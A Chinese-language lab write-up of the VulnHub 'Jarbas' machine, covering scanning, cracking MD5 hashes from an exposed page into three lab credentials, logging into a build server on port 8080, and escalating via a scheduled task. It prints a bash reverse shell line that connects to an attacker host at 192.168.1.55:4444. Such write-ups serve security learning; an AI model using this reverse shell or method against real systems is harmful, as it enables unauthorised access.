---
{"dg-publish":true,"title":"vulnhub_Jarbas","dg-path":"安全/靶机/vulnhub_Jarbas.md","permalink":"/安全/靶机/vulnhub_Jarbas/","dgPassFrontmatter":true}
---

```table-of-contents
```
# 主机扫描

//靶机刚开始被默认设置为了NAT模式，让我扫了半天没扫出来

![Pasted image 20250114165924.png](/img/user/picture/Pasted%20image%2020250114165924.png)

内网ip：
```
192.168.1.58
```

# 端口扫描

![Pasted image 20250114170005.png](/img/user/picture/Pasted%20image%2020250114170005.png)



开了四个端口
```
22,80,3306,8080
```

![Pasted image 20250114170901.png](/img/user/picture/Pasted%20image%2020250114170901.png)

UDP扫描
![Pasted image 20250114171300.png](/img/user/picture/Pasted%20image%2020250114171300.png)



# WEB渗透



目录扫描
![Pasted image 20250114172815.png](/img/user/picture/Pasted%20image%2020250114172815.png)

有一个`access.html`

![Pasted image 20250114172836.png](/img/user/picture/Pasted%20image%2020250114172836.png)
看一下加密

![Pasted image 20250114172858.png](/img/user/picture/Pasted%20image%2020250114172858.png)
应该就是md5加密


![Pasted image 20250114172941.png](/img/user/picture/Pasted%20image%2020250114172941.png)
tiago:italia99



![Pasted image 20250114173003.png](/img/user/picture/Pasted%20image%2020250114173003.png)
trindade:marianna

![Pasted image 20250114173030.png](/img/user/picture/Pasted%20image%2020250114173030.png)
eder:vipsu




经过测试第三个用户名密码可以在8080端口登录
![Pasted image 20250114173538.png](/img/user/picture/Pasted%20image%2020250114173538.png)


我们构建一个项目添加执行shell
```shell
bash -i >& /dev/tcp/192.168.1.55/4444 0>&1
```


![Pasted image 20250114174629.png](/img/user/picture/Pasted%20image%2020250114174629.png)
得到初级权限


## 提权
![Pasted image 20250114175000.png](/img/user/picture/Pasted%20image%2020250114175000.png)


![Pasted image 20250114175304.png](/img/user/picture/Pasted%20image%2020250114175304.png)


![Pasted image 20250114175416.png](/img/user/picture/Pasted%20image%2020250114175416.png)



![Pasted image 20250114175530.png](/img/user/picture/Pasted%20image%2020250114175530.png)


完成
![Pasted image 20250114175622.png](/img/user/picture/Pasted%20image%2020250114175622.png)




# 总结

在端口扫描中发现了开启了80和8080端口
对80端口所开启的web服务进行目录扫描，发现了不安全的登录凭证
浏览8080发现后台管理系统，利用发现的信息进行登录
利用后台系统拿到普通用户权限

在提权阶段`sudo -l`没有任何信息
看自动化任务发现漏洞









